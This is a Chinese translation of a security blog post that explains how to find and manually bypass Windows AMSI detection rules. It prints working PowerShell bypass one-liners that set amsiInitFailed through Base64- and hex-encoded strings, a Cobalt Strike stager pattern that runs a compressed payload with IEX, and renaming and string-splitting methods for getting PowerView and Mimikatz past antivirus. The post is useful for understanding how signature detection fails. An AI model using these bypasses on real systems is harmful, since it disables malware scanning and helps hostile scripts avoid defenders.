> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8283)

```
译文声明
本文是翻译文章，文章原作者 S3cur3Th1sSh1t
原文地址：https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/

译文仅供参考，具体内容表达以及含义原文为准
```

本篇内容是关于如何手动绕过 AMSI 的检测规则，其实绕过方法我们都很熟悉。

### 0x00 介绍

简单来说，`Antimalware Scan Interface（AMSI` 是微软推出的一个接口，用于洞察攻击者尝试内存加载恶意程序 / 脚本的过程。据[微软介绍](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)，AMSI 用于以下 Windows 组件。

*   用户账户控制（UAC）；
*   PowerShell（脚本、交互式使用和动态代码评测）；
*   Windows 主机脚本（wscript.exe 和 cscript.exe）；
*   JavaScript 和 VBScript；
*   Office VBA 宏。

有很多博客文章都有介绍如何绕过 AMSI，其中包含了原理及 POC 代码。这些文章的内容大部分都是针对 `amsi.dll` 进行 hook，目的是阻止 `amsi.dll` 模块的正常使用（扫描）或是返回一个无异常的结果。这可以通过对内存中的 dll 修补或在当前工作目录中放置一个单独的 `amsi.dll` 来实现的。如果你有兴趣想了解更多的关于 AMSI 的机制及绕过的信息，可以在[这里](https://blog.f-secure.com/hunting-for-amsi-bypasses/)或[这里阅读](https://www.contextis.com/en/blog/amsi-bypass)。

到目前为止，我发现所有公布出来的关于 AMSI 的 Bypass 技巧，其中的代码段、触发器等等都会被各大平台标记为 “恶意”。

并且我还发现，没有哪篇文章内容中提及**如何手动查找和绕过检测规则**。也就是说，文章中只是提到了方法 / 代码可以绕过 AMSI，但至于为什么能绕过，并没有详细的一个过程。这个过程对于再次绕过或其他工具的使用起着至关重要的作用。因此，在本篇文章中，我将填补这个过程。

### 0x01 最短的 Bypass

马特 · 格雷伯（Matt Graeber）在 2016 年发布了一条关于绕过 AMSI 的[推文](https://twitter.com/mattifestation/status/735261120487772160)，内容如下：

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)


```

这个 `Bypass` 技巧，主要是给 `amsiInitFailed` 对象赋予一个 `boolean True` 值，这样会让 AMSI 的初始化失败，从而不对当前进程进行扫描。

但只要在 Powershell 中执行这个 oneliner，就会得到一个消息：**This script contains malicious content and has been blocked by your antivirus software**。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913140848-96e3aed6-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913140848-96e3aed6-f587-1.jpeg)

从这开始，我将重点介绍如何从这个推文的 Bypass 技巧开始，找到并修改 Powershell 脚本或 C# 源码的触发点。

### 0x02 有了自动混淆工具，为什么还要手动查找？

为了绕过 AMSI，我们可以使用自动混淆工具。也可以手动修改代码。对于 Powershell 脚本，我们可以使用 Daniel Bohannon 的 [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) 或 [ISE-Steroids](https://www.powershellgallery.com/packages/ISESteroids/2.7.1.7) 脚本进行混淆。

如果你使用了自动混淆的工具，会节省很多的时间，并且如果幸运的话，二进制文件可以正常运行，所以混淆并没有破坏掉二进制原有的功能。但是，例如 [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) 等开源脚本，都会被各大厂商收录，因此在有安全软件的环境中运行被该脚本混淆的 powershell 脚本，很有可能被检测到。此外，大部分混淆器会大大增加二进制文件的大小。例如，`Invoke-Mimikatz` 由于内嵌 base64 编码的 Mimikatz 二进制文件，其大小约为 3MB，使用 `ISE-Steroids` 混淆的 `Invoke-Mimikatz` 的大小会高达 8MB 左右，因为这里有很多的字符串也是 base64 编码的。至少使用自动化混淆工具是不能保证绕过 AMSI 的。

为了更可靠的绕过 AMSI，可以选择手动查找并修改。使用此方式，你也可能更高的了解 AMSI 的实际拦截规则及其工作原理。

### 0x03 如何查找且绕过检测规则

要查找触发 AMSI 检测的字符串，可以采用不同的方法。这些方法与 SQL 注入绕 WAF 方法基本一致。

首先，我们看一下上面提到的简单的 `oneliner`。如果 AMSI 是 5 年前的老式 AV 产品，它就会有一个包含恶意脚本 / 可执行文件哈希值的数据库，根据这个数据库检查所有加载的内容。但事实上并非如此，它不是在寻找文件的哈希值，而是查找文件中的关键字，比如寻找像 `Invoke-Mimikatz`、`AmsiScanBuffer`、`amsiInitFailed`、`AmsiUtils` 及其他更多的特定字符串特征。

因此，如果一个脚本 / 二进制文件中包含有某些字符串特征，则会被标记为恶意并阻止加载。在我个人看来，嘴贱的方法就是将这些字符串进行拼接，以便绕过这个字符串特征的检测。让我们来看看效果是怎么样：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913140909-a345e360-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913140909-a345e360-f587-1.jpeg)

字符串本身会被标记，但如果是拼接起来的，则可以绕过该规则。如果你想知道脚本中哪些地方触发了 AMSI 的检测，则必须对该脚本代码进行详细的测试，也就是单个字符串或一整行的进行测试。但如果代码量非常的多，这是非常的费时费力的，因此我们可以编写测试脚本，引入 `amsl.dll` ，然后调用 `AmsiScanBuffer` 来进行检测，从而判断代码是否为恶意代码。RythmStick 写了一个非常有用的工具，叫做 [AMSITrigger](https://github.com/RythmStick/AMSITrigger)，其目的就是解决手工检测的问题，以下是使用情况及返回结果。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913140920-a985819a-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913140920-a985819a-f587-1.jpeg)

所以，对于上图的这个 `PoC.ps1` 文件，我们只需要对 `AmsiUtils` 和 `amsiInitFailed` 进行修改，就可以绕过 AMSI。我稍后再来讨论写这篇文章时的测试情况。

我不清楚这部分内容是否有人已经发布，但是 AMSI 还不只是标记字符串。如果你为 马特 · 格雷伯（Matt Graeber）的 Bypass 技巧做进一步的字符串拼接测试，你会发现，即使 `sub` 字符串本身没有，也会被检测到。让我们来看看：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913140928-aebcdfaa-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913140928-aebcdfaa-f587-1.jpeg)

所以，我们深入研究一下这个问题。如果 AMSI 只是寻找单个字符串并阻止它们，我们应该能够识别这个字符串。我们可以通过依次执行该 `oneliner` 的单个部分代码来实现的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913140943-b77658ec-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913140943-b77658ec-f587-1.jpeg)

当添加到 `SetValu` 时，代码仍可正常运行。但添加到 `SetValue`，就木得了、

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913140950-bb76f2b2-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913140950-bb76f2b2-f587-1.jpeg)

我们再进一步把 `amsiInitFailed`、`NonPublic` 和 `Static` 的值改成类似于 `asd` 的其他字符串，并尽可能地从 `GetType()` 的值中删除它，这整个脚本仍然被阻塞。但是第一和第二部分没有被触发。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913140957-bfa79e72-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913140957-bfa79e72-f587-1.jpeg)

这对于我来说，这显然像是一个正则匹配，例如下面的 `regex` 就可以做这个触发器。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913141005-c4cbf826-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913141005-c4cbf826-f587-1.jpeg)

像这样的触发器还有很多。例如，[cobalt strike Powershell stager](https://offensivedefence.co.uk/posts/making-amsi-jump/) 包含一个类似于 regex 的触发器，它看起来像这样。

```
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sI[...snip...]AA=="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();


```

然而，有一个简单的绕过技巧，直接使用 `$a` 代替 `$s` 作为变量名，或者在中间使用一个新行。

```
$a=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sI[...snip...]AA=="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($a,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();


```

我的 [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) 脚本也被类似的 `regex` 标记了，该正则表达式标记了每个脚本的两行：

```
$base64binary="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ"
 $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))


```

但绕过这样的触发规则其实真的很容易。你可以使用下面的命令将脚本中的 `$base64binary` 变量值改为`$encodedbinary` 。

```
git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git
cd PowerSharpPack
find ./ -type f -print0 | xargs -0 sed -i "s/\$base64binary/\$encodedbinary/g"


```

该脚本更改之后应该不会再触发 AMSI 检测规则，但这仅限于脚本本身内容。如果 Base64 编码中的二进制有一些字符串触发规则，这还需要对该二进制进行修改。

我们来看看 2016 年的 Bypass 技巧。我们发现 `amsiInitFailed` 和 `AmsiUtils` 这两个字符串是会触发检测规则。而如果这两个字符串串连起来的话，也会触发检测规则。在这种情况下，我们不能只更改字符串，因为如果这样做了之后，该 Bypass 本身就不起作用了。我们其实还有其他的一些选择。

我们可以用任何你能想到的编码方式对它们进行编码。Base64（任何其他 Base 编码）、HTML、ASCII 或 ROT13 等更多的编码方式，这些都是无限的可能。显然，我们唯一要做的就是在运行时对编码进行解码，进而得到这两个字符串，这样该 Bypass 技巧才起到作用。在 powershell 中，Base64 的编码 / 解码可以这样做：

```
[System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("AmsiUtils"))
[System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("amsiInitFailed"))


```

为了在运行时得到正确的结果，我们可以使用：

```
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VALUE')))


```

因此，如果我们修改这两个字符串，将其编码为 base64，并在运行时进行解码，使用以下脚本可以达到效果：

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)


```

在写这篇文章的时候，该技巧足以绕过所有的触发规则。为了好玩，我们对 HEX 值也做同样的处理。获取这些触发字符串的 HEX 值的方法是这样的：

```
'AmsiUtils' | Format-Hex
'amsiInitFailed' | Format-Hex -Encoding utf8


```

在运行时解码，因此多了一个有效的 Bypass 是这样的：

```
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)


```

当然，我们可以结合不同的编码技术、拼接和例如 AES 或 3DES 等加密技术来获得一个不会触发 AMSI 的脚本。与编码方式相比，加密的方式是绕过 AMSI 最可靠的方法。因为强加密算法在密文有着非常高的随机性。但我将编码和加密的方法都结合呈现出来，以便读者更好的对比学习。

在这一点上，我很确定这里的两个 Bypass 技巧很快就会被标记。所以，如果你不想做这么多的工作进行 AMSI 绕过，我这里还推荐 Flangvik 的 [amsi.fail](https://amsi.fail/) 项目，该项目可以自动为你的脚本进行修改。

直到今天，我仍然在大多数的渗透测试中使用开源的 powerhell 项目，尽管有 "约束语言模式"、"AMSI" 或 "脚本块记录" 等措施。但很多公司只实现了这些措施中的某些部分或压根没有实现。因此，我将以另一个例子来说明一个已经被标记很久的脚本是如何绕过 AMSI 的，它就是 `Powerview.ps1`。

*   首先要做的就是删除所有的注释，我注释中发现了很多的触发字符；
*   此外，我们还要减少不必要的代码，可以通过正则来删除它们，这次我打算使用 `ISE-Steroids`。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913141032-d4a90446-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913141032-d4a90446-f587-1.jpeg)

我们在这里暂时不做任何混淆，因为我们要准确定位触发器。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913141037-d77d9236-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913141037-d77d9236-f587-1.jpeg)

现在运行 AMSITrigger 来检测运行所产生的脚本，会发现以下两行是类似触发器的 regex。

```
if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket"


```

我们只需将 `krbtgt` 连接成 `'kr'+'bt'+'gt'` 就可以解决这个问题，解决问题后，则可以得到一个不会触发 AMSI 的 `PowerView.ps1`。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913141045-dc39b99e-f587-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913141045-dc39b99e-f587-1.jpeg)

那么，如果一个函数名、变量名或脚本的其他部分被标记为不能在运行时进行编码和解码，那怎么办？有几种方式解决这个问题。我自己更喜欢更改函数 / 变量的名称，因为这里的检测率最低。例如，Invoke-Mimikatz 就变成了 CuteLittleKittie。如果你不想记住一个新的名字，你也可以把一些小字母改成大写字母。在 Powershell 中，你可以像 **_Invoke-Obfuscation_** 那样插入反标。比如 **_InV`OKe-Mim`iKaTz_** 必须触发。

在 C# 中，同理，可以一样的方法进行绕过。

### 0x04 结论

我们发现，单字和字符串都可以成为 AMSI 的触发器。在许多情况下，简单地替换变量 / 函数名或值的编码以及运行时的解码就足以绕过 AMSI。有些触发器是类似于 regex 的，因此很难找到 / 绕过。但是，如果改变这个 regex 值的固定部分，则不会触发 AMSI 。

我的经验是，现在每个 AV 厂商都会建立自己的检测规则，可以用来识别带有 amsi.dll 的恶意软件。因此，应该针对每个厂商的触发器进行搜索和修改。

如果在要加载的脚本 / 二进制文件中修改了触发器本身，基本上就不需要旁路了。